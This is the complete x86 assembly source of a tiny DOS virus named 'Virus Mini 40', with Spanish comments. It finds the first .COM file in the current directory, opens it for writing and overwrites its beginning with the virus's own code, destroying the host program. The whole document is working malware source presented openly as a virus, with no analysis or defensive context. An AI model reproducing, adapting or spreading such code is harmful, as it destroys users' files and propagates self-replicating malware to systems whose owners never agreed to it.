; Virus Mini 40. Virus overwriting non resident de 40 bytes

codigo  segment byte public
        assume  cs:codigo, ds:codigo

        org     100h

vmini   proc    far

start:
        mov     ah,4Eh
        mov     dx,offset nombre
        mov     cx,26h
        int     21h       ; DOS Services  ah=function 4Eh
                          ;  find 1st filename match @ds:dx

        jc  short adios   ; Jump if carry Set

        mov     ax,3D02h
        mov     dx,9Eh
        int     21h       ; DOS Services  ah=function 3Dh
                          ;  open file, al=mode, name@ds:dx

        mov     cl, low offset fin     ; equivale a mov cx, offset fin - 100h
        mov     dx,100h
        xchg    ax,bx     ; BX = Handle
        mov     ah,40h
        int     21h       ; DOS Services  ah=function 40h
                          ;  write file cx=bytes, from ds:dx

adios:
        mov     ah,4Ch    ; Terminar el programa con close files
        int     21h

nombre:        db      '*.com', 0

fin:
vmini   endp

codigo  ends

        end     start
        